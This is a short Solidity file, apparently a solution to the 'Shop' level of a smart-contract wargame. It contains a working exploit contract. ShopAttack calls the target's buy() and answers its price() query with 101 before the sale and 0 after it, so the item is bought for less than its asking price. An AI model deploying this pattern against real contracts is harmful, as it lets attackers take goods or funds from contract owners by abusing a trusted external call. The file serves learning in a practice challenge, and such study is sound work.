// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_21_Shop.sol";

contract ShopAttack {
    function attack(address shopAddress) public {
        Shop(shopAddress).buy();
    }

    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 101;
    }
}
